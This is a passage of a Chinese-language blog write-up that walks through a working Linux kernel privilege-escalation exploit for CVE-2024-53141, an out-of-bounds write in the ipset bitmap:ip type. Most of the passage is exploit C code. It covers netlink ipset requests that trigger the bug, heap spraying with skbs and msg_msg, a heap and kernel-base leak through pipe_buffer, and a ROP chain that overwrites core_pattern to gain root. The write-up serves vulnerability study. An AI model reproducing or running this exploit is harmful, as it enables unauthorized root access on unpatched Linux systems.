<span class="number">0x100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, spray_fd[i]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// make comment_string be allocated under kmalloc-192</span></span><br><span class="line">	<span class="built_in">memset</span>(comment_string, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">	msg.mtype = <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> fail = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> sock_fd = netlink_open(NETLINK_NETFILTER);</span><br><span class="line">	<span class="keyword">if</span> (sock_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to open Netlink socket\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(name, <span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-512 skbs ahead</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">				SYSCHK(write(spray_fd[i][<span class="number">0</span>], buf, <span class="number">0x80</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// allocate target ipset</span></span><br><span class="line">		create_ip_set_kmalloc_1024(sock_fd, name, <span class="string">&quot;bitmap:ip&quot;</span>, AF_INET,i==<span class="number">0x800</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// set bit to each ipset in order to make oob write stop</span></span><br><span class="line">		add_ip_to_set(sock_fd, name, <span class="string">&quot;A&quot;</span>, AF_INET,htonl(<span class="number">-0x35</span>));</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-512 skbs after allocating target ipset</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">				SYSCHK(write(spray_fd[i][<span class="number">1</span>], buf, <span class="number">0x80</span>));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// trigger oob write to keep allocate comment_string to overwrite next chunk(skb) contents as kernel heap</span></span><br><span class="line">	trigger_oob_leak(sock_fd, <span class="string">&quot;2048&quot;</span>, <span class="string">&quot;A&quot;</span>, AF_INET);</span><br></pre></td></tr></table></figure>

<p>​	这里便是触发漏洞的关键代码，首先做一下准备条件，先对于后面堆喷msg_msg结构体以及skb_buff进行准备，之后便是通过创建ip_set来触发漏洞。我们重点关注循环的设计，首先是一直循环创建ipset，每一个ipset都以循环的名字命名，之后当到达2048的时候，进行特殊的处理，首先进行skb_buff堆喷，之后分配ip_set，并且这里有一个flag标志，之后创建完ip_set之后继续进行堆喷。到这里很好理解，实际上就是通过堆喷kmalloc-cg-512，使得之前说的存在越界写的位置可以再skb_buff的object里面写一个堆地址，也就是comment指针（下面会详细阐述如何实现这个漏洞的），这样我们就可以获取一个kmalloc-cg-192的地址，方便后面对于kmalloc-cg-1k的Object地址进行猜测。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_ip_set_kmalloc_1024</span><span class="params">(<span class="type">int</span> sock_fd, <span class="type">const</span> <span class="type">char</span> *set_name, <span class="type">const</span> <span class="type">char</span> *type_name, <span class="type">uint8_t</span> family, <span class="type">int</span> extra)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> mnl_nlmsg_put_header(buf);</span><br><span class="line"></span><br><span class="line">	nlh-&gt;nlmsg_type = IPSET_CMD_CREATE | (<span class="number">6</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">	nlh-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;</span><br><span class="line"></span><br><span class="line">	mnl_nlmsg_put_extra_header(nlh, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);</span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_SETNAME, set_name);</span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_TYPENAME, type_name);</span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_FAMILY, family);</span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_REVISION, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_data</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_DATA);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_ip</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_IP);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 0x35*8+0x58 is under kmalloc-cg-512</span></span><br><span class="line">	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(<span class="number">-0x35</span>));</span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_ip);</span><br><span class="line"></span><br><span class="line">	attr_ip = mnl_attr_nest_start(nlh, IPSET_ATTR_IP_TO);</span><br><span class="line">	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(<span class="number">-1</span>));</span><br><span class="line">	mnl_attr_nest_end(nlh, attr_ip);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (extra)</span><br><span class="line">		mnl_attr_put_u32(nlh, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, htonl(IPSET_FLAG_WITH_COMMENT));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// map size depend on map = ip_set_alloc(sizeof(*map) + elements * set-&gt;dsize);</span></span><br><span class="line">	<span class="comment">// IPSET_FLAG_WITH_COMMENT cause set-&gt;dsize == 0x8</span></span><br><span class="line">	<span class="comment">// 0x35*0x8 + sizeof(*map) is under kmalloc-cg-512</span></span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> netlink_send(sock_fd, nlh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这里就是如何创建ip_set，首先关注一下create_ip_set_kmalloc_1024函数，其实原理很简单，最开始这些步骤就是简单设置一些需要利用ipset通信的配置信息mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);这里就是我之前说的设置协议的版本，如果5开头的kernel之前的版本时不支持ipset6的。之后便是设置first_ip和last_ip，并且对于flag也有详细的要求，只有到达了2048这个object才会单独设置允许添加Comment的ip_set。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">trigger_oob_leak</span><span class="params">(<span class="type">int</span> sock_fd, <span class="type">const</span> <span class="type">char</span> *set_name, <span class="type">const</span> <span class="type">char</span> *cidr, <span class="type">uint8_t</span> family)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> mnl_nlmsg_put_header(buf);</span><br><span class="line"></span><br><span class="line">	nlh-&gt;nlmsg_type = IPSET_CMD_ADD | (<span class="number">6</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">	nlh-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_EXCL;</span><br><span class="line"></span><br><span class="line">	mnl_nlmsg_put_extra_header(nlh, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);</span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_SETNAME, set_name);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_FAMILY, family);</span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_REVISION, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_data</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_DATA);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_ip</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_IP);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_ip);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// IPSET_ATTR_CIDR==3 make `ip` is 0xe0000000 and `ip_to` 0xffffffff</span></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_CIDR, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_COMMENT, comment_string);</span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> netlink_send(sock_fd, nlh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后对于触发oob读就是利用之前讲述的原理，通过设置IPSET_ATTR_CIDR，可以触发漏洞，并且再下一个object的空间中写入堆地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	recv(spray_fd[i][<span class="number">0</span>], buf, <span class="number">0x80</span>, MSG_PEEK);</span><br><span class="line">	<span class="keyword">if</span> (buf[<span class="number">0</span>])</span><br><span class="line">		pipe_buf_addr = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0</span>]);</span><br><span class="line">	recv(spray_fd[i][<span class="number">1</span>], buf, <span class="number">0x80</span>, MSG_PEEK);</span><br><span class="line">	<span class="keyword">if</span> (buf[<span class="number">0</span>])</span><br><span class="line">		pipe_buf_addr = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;leak heap addr 0x%lx\n&quot;</span>, pipe_buf_addr);</span><br><span class="line"><span class="keyword">if</span> (pipe_buf_addr == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We choose a guess addr, hope its under kmalloc-cg-1024</span></span><br><span class="line"><span class="comment">// Later we will reclaim it as pipe_buf</span></span><br><span class="line">pipe_buf_addr &amp;= ~(<span class="number">0x10000000</span> - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our guess kernel heap addr 0x%lx\n&quot;</span>, pipe_buf_addr);</span><br></pre></td></tr></table></figure>

<p>​	这里便是对于内核kmalloc-cg-192的地址进行猜测，希望可以猜测的地址可以指向kmalloc-cg-1k的object，至此，完成了对于泄露堆地址的全部内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">sprintf</span>(name, <span class="string">&quot;x%d&quot;</span>, i);</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-2048 msg_msgseg ahead</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">			SYSCHK(msgsnd(msqid[i], &amp;msg, <span class="number">0x1000</span> - <span class="number">0x30</span> + <span class="number">0x800</span> - <span class="number">0x8</span>, <span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// allocate target ipset</span></span><br><span class="line">	create_ip_set_kmalloc_2048(sock_fd, name, <span class="string">&quot;bitmap:ip&quot;</span>, AF_INET,i == <span class="number">0x800</span>);</span><br><span class="line">	<span class="comment">// set bit to each ipset in order to make oob write stop</span></span><br><span class="line">	add_ip_to_set(sock_fd, name, <span class="string">&quot;A&quot;</span>, AF_INET,htonl(<span class="number">-0x40</span> + <span class="number">0x3b</span>));</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-2048 msg_msgseg after allocating target ipset</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">			SYSCHK(msgsnd(msqid[i + <span class="number">0x1000</span>], &amp;msg, <span class="number">0x1000</span> - <span class="number">0x30</span> + <span class="number">0x800</span> - <span class="number">0x8</span>, <span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger oob write to overwrite next chunk(msg_msgseg&#x27;s next) as our guessed addr</span></span><br><span class="line">trigger_oob_write(sock_fd, <span class="string">&quot;x2048&quot;</span>, <span class="string">&quot;A&quot;</span>, AF_INET);</span><br></pre></td></tr></table></figure>

<p>​	之后便是利用猜测到的堆地址进行越界写，这里需要注意的是htonl(-0x40 + 0x3b)部分，实际上就是对于结束地址的检测，这里可以通过计算来获取，因为获取到kmalloc-cg-2048的内存实际上是比bitmap_ip预设的内存大的，因此需要覆盖很多地址才可以覆盖到下一个Object，这里会从0x40的object开始写内容，其实已经到了下一个object了（8byte的Bitmap只能存储64位），所以我们要计算一下需要覆盖多少才能到下一个object，bitmap_ip结构体本身大小是0x58，扩展域是0x40 * 0x10 &#x3D; 0x400，因此有0x800 - 0x458 &#x3D; 0x3a8的内存来覆盖，一次覆盖0x10大小的内容，需要覆盖0x3b次内容才可以实现越界写。</p>
<p><img src="/./images/CVE-2024-53141/1742267449936.jpg" alt="1742267449936"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free all msg_msgseg, it also free our guessed addr</span></span><br><span class="line"><span class="comment">// we don&#x27;t need to read to prevent stuck at deadloop</span></span><br><span class="line"><span class="type">char</span>* read_only = SYSCHK(mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ,MAP_ANON|MAP_PRIVATE,<span class="number">-1</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++)</span><br><span class="line">	msgrcv(msqid[i], read_only, <span class="number">0x1000</span> - <span class="number">0x30</span> + <span class="number">0x800</span> - <span class="number">0x8</span>, <span class="number">1</span>, IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// We reclaim our guessed addr as pipe_buf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPIPE; i++)</span><br><span class="line">	SYSCHK(pipe(pipe_fd[i]));</span><br><span class="line"></span><br><span class="line"><span class="comment">// write data on pipe to leak kernel base address</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPIPE; i++)</span><br><span class="line">&#123;</span><br><span class="line">	SYSCHK(write(pipe_fd[i][<span class="number">1</span>], buf, <span class="number">0x1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// read and free skb,</span></span><br><span class="line"><span class="comment">// if it has non-null contents, it means it should be pipe_buf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x100</span>; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		read(spray_fd2[i][<span class="number">0</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">		KERNEL_BASE = *(<span class="type">size_t</span>*)&amp;buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(KERNEL_BASE)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		read(spray_fd2[i][<span class="number">1</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">		KERNEL_BASE = *(<span class="type">size_t</span>*)&amp;buf[<span class="number">0x10</span>];</span><br><span class="line">		<span class="keyword">if</span>(KERNEL_BASE)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(KERNEL_BASE)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel base</span></span><br><span class="line">KERNEL_BASE -= ANON_PIPE_BUF_OPS_OFF; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;KERNEL_BASE %lx\n&quot;</span>, KERNEL_BASE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// craft pipe_buffer with rop chain</span></span><br><span class="line">build_fake_pipe_buffer_with_rop_chain(pipe_buf_addr, (<span class="type">char</span> *)buf);</span><br></pre></td></tr></table></figure>

<p>​	之后便是对于msg_msg结构体free，之后再利用pipebuffer进行堆喷，并且读取对应结构体信息，以此获取堆基地址，根据这个基地址我们就可以进行rop链，覆盖pipe_buffer的release指针，最终实现攻击效果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">build_fake_pipe_buffer_with_rop_chain</span><span class="params">(<span class="type">size_t</span> rop_addr, <span class="type">char</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x8</span>] = POP_RDI;</span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x18</span>] = POP_RSP;</span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x20</span>] = rop_addr + START_ROP;</span><br><span class="line"></span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x10</span>] = rop_addr + <span class="number">0x20</span>; <span class="comment">// set pipe_buffer.ops</span></span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x28</span>] = PIVOT3;			 <span class="comment">// set pipe_buf_operations.release</span></span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x39</span>] = PIVOT2;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// copy_from_user(core_pattern, user_buf, sizeof(user_buf);</span></span><br><span class="line">	ROP(i++) = POP_RDI;</span><br><span class="line">	ROP(i++) = CORE_PATTERN;</span><br><span class="line">	ROP(i++) = POP_RSI2;</span><br><span class="line">	ROP(i++) = (<span class="type">size_t</span>)&amp;user_buf;</span><br><span class="line">	ROP(i++) = POP_RDX;</span><br><span class="line">	ROP(i++) = <span class="keyword">sizeof</span>(user_buf);</span><br><span class="line">	ROP(i++) = COPY_FROM_USER;</span><br><span class="line">	<span class="comment">// msleep(0x10000);</span></span><br><span class="line">	ROP(i++) = POP_RDI;</span><br><span class="line">	ROP(i++) = <span class="number">0x10000</span>;</span><br><span class="line">	ROP(i++) = MSLEEP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	上述便是对于rop链构造的情况，覆盖CORE_PATTERN，与exp最开始监控部分进行交互，最终达到获取权限的效果。</p>
<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>​	对于该漏洞进行不断调试，了解到了一下真实世界的CVE是如何利用提权的，并且再利用不同版本的内核进行测试，虽然漏洞攻击成功率并不是很高，并且无法对于所有版本的内核均可以使用，但是依旧会引发很大的破坏，并且在调试的过程中也更加清晰的看到对应原理和内核设计的细节，学到了很多东西。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/03/10/TPCTF-EzDB/" rel="prev" title="TPCTF-EzDB">
      <i class="fa fa-chevron-left"></i> TPCTF-EzDB
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2024-53141"><span class="nav-number">1.</span> <span class="nav-text">CVE-2024-53141</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">一.漏洞背景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-ip-set%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 ip_set介绍</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.2.</span> <span class="nav-text">二.漏洞成因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E6%B3%84%E9%9C%B2%E5%87%BA%E5%86%85%E6%A0%B8%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 泄露出内核堆地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E9%98%B2%E6%AD%A2%E8%B6%8A%E7%95%8C%E5%86%99%E5%AF%BC%E8%87%B4%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 防止越界写导致程序崩溃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-UAF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 UAF漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-exp%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">三.exp利用原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">四.总结</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">a2ure</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
